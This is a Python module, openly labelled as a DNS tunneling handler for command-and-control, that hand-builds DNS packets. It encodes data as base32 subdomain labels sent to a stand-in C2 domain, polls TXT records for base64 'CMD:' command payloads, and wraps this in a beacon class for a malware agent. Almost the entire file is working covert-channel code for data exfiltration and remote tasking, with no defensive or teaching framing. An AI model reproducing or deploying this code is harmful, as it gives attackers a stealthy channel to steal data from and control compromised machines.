#!/usr/bin/env python3
"""
DNS Protocol Handler - DNS Tunneling for C2
Features: DNS queries for beaconing, TXT records for data exfiltration
"""

import socket
import struct
import base64
import hashlib
import time
import random
from typing import Optional, Dict, List, Tuple
import threading
import json
from collections import deque

class DNSProtocol:
    """DNS protocol handler for C2 communication"""
    
    # DNS header structure
    DNS_HEADER = struct.Struct('!HHHHHH')
    
    # DNS record types
    TYPE_A = 1
    TYPE_NS = 2
    TYPE_CNAME = 5
    TYPE_SOA = 6
    TYPE_MX = 15
    TYPE_TXT = 16
    TYPE_AAAA = 28
    
    # DNS classes
    CLASS_IN = 1
    
    def __init__(self, domain: str = "c2.example.com", server: str = "8.8.8.8"):
        self.domain = domain
        self.server = server
        self.beacon_id = None
        self.sequence = 0
        self.pending_requests = {}
        self.response_queue = deque()
        
    def build_dns_query(self, domain: str, qtype: int = TYPE_A) -> bytes:
        """Build DNS query packet"""
        # Transaction ID
        txid = random.randint(0, 65535)
        
        # Flags: standard query
        flags = 0x0100  # RD bit set
        
        # Questions, Answer RRs, Authority RRs, Additional RRs
        qdcount = 1
        ancount = 0
        nscount = 0
        arcount = 0
        
        # Build header
        header = self.DNS_HEADER.pack(txid, flags, qdcount, ancount, nscount, arcount)
        
        # Build question
        question = self.encode_domain_name(domain) + struct.pack('!HH', qtype, self.CLASS_IN)
        
        return header + question
    
    def encode_domain_name(self, domain: str) -> bytes:
        """Encode domain name for DNS packet"""
        parts = domain.split('.')
        encoded = b''
        for part in parts:
            encoded += bytes([len(part)]) + part.encode()
        encoded += b'\x00'
        return encoded
    
    def decode_domain_name(self, data: bytes, offset: int) -> Tuple[str, int]:
        """Decode domain name from DNS packet"""
        labels = []
        while True:
            length = data[offset]
            if length == 0:
                offset += 1
                break
            if length & 0xC0:  # Compression pointer
                offset += 2
                break
            labels.append(data[offset+1:offset+1+length].decode())
            offset += length + 1
        return '.'.join(labels), offset
    
    def parse_dns_response(self, data: bytes) -> Dict:
        """Parse DNS response packet"""
        try:
            # Parse header
            txid, flags, qdcount, ancount, nscount, arcount = self.DNS_HEADER.unpack(data[:12])
            
            offset = 12
            
            # Parse questions
            questions = []
            for _ in range(qdcount):
                name, offset = self.decode_domain_name(data, offset)
                qtype, qclass = struct.unpack('!HH', data[offset:offset+4])
                offset += 4
                questions.append({'name': name, 'type': qtype, 'class': qclass})
            
            # Parse answers
            answers = []
            for _ in range(ancount):
                name, offset = self.decode_domain_name(data, offset)
                rtype, rclass, ttl, rdlength = struct.unpack('!HHIH', data[offset:offset+10])
                offset += 10
                rdata = data[offset:offset+rdlength]
                offset += rdlength
                
                if rtype == self.TYPE_A:
                    ip = socket.inet_ntoa(rdata)
                    answers.append({'name': name, 'type': rtype, 'data': ip})
                elif rtype == self.TYPE_TXT:
                    txt_data = rdata[1:].decode()
                    answers.append({'name': name, 'type': rtype, 'data': txt_data})
                elif rtype == self.TYPE_CNAME:
                    cname, _ = self.decode_domain_name(rdata, 0)
                    answers.append({'name': name, 'type': rtype, 'data': cname})
            
            return {
                'txid': txid,
                'questions': questions,
                'answers': answers
            }
        except Exception as e:
            return {'error': str(e)}
    
    def send_dns_query(self, domain: str, qtype: int = TYPE_A) -> Optional[Dict]:
        """Send DNS query and receive response"""
        try:
            query = self.build_dns_query(domain, qtype)
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5)
            sock.sendto(query, (self.server, 53))
            
            data, _ = sock.recvfrom(4096)
            sock.close()
            
            return self.parse_dns_response(data)
        except Exception as e:
            return None
    
    def encode_data_dns(self, data: bytes, chunk_size: int = 50) -> List[str]:
        """Encode data for DNS queries"""
        encoded = base64.b32encode(data).decode().replace('=', '')
        chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
        return chunks
    
    def decode_data_dns(self, chunks: List[str]) -> bytes:
        """Decode data from DNS chunks"""
        data = ''.join(chunks)
        # Add padding if needed
        padding = 8 - (len(data) % 8)
        if padding < 8:
            data += '=' * padding
        return base64.b32decode(data)
    
    def beacon_dns(self, beacon_data: Dict) -> bool:
        """Send beacon via DNS"""
        try:
            # Encode beacon data
            json_data = json.dumps(beacon_data)
            chunks = self.encode_data_dns(json_data.encode())
            
            # Send chunks as subdomains
            for i, chunk in enumerate(chunks):
                subdomain = f"{self.sequence}.{chunk}.{self.domain}"
                response = self.send_dns_query(subdomain)
                if response and 'answers' in response:
                    self.sequence += 1
                time.sleep(0.1)  # Rate limiting
            
            # Check for commands
            return self.check_for_commands()
        except Exception as e:
            return False
    
    def check_for_commands(self) -> bool:
        """Check for commands via DNS"""
        try:
            # Query for TXT records with command data
            subdomain = f"cmd.{self.beacon_id}.{self.domain}"
            response = self.send_dns_query(subdomain, self.TYPE_TXT)
            
            if response and 'answers' in response:
                for answer in response['answers']:
                    if answer['type'] == self.TYPE_TXT:
                        data = answer['data']
                        if data.startswith('CMD:'):
                            # Parse command
                            cmd_data = base64.b64decode(data[4:])
                            commands = json.loads(cmd_data)
                            self.response_queue.append(commands)
                            return True
            return False
        except:
            return False
    
    def send_response_dns(self, response_data: Dict) -> bool:
        """Send response via DNS"""
        try:
            json_data = json.dumps(response_data)
            chunks = self.encode_data_dns(json_data.encode())
            
            for i, chunk in enumerate(chunks):
                subdomain = f"res.{self.sequence}.{chunk}.{self.domain}"
                self.send_dns_query(subdomain, self.TYPE_TXT)
                self.sequence += 1
                time.sleep(0.1)
            
            return True
        except:
            return False


class DNSBeaconProtocol(BeaconProtocol):
    """DNS beacon protocol for C2 agent"""
    
    def __init__(self, server: str, port: int, domain: str = "c2.example.com"):
        super().__init__(server, port)
        self.dns = DNSProtocol(domain)
        self.dns.beacon_id = AgentConfig.AGENT_NAME
        
    def send_beacon(self, data: Dict) -> Optional[str]:
        """Send beacon via DNS"""
        if self.dns.beacon_dns(data):
            return "beacon_sent"
        return None
    
    def receive_commands(self) -> Optional[List[Dict]]:
        """Receive commands via DNS"""
        if self.dns.response_queue:
            return self.dns.response_queue.popleft()
        return None
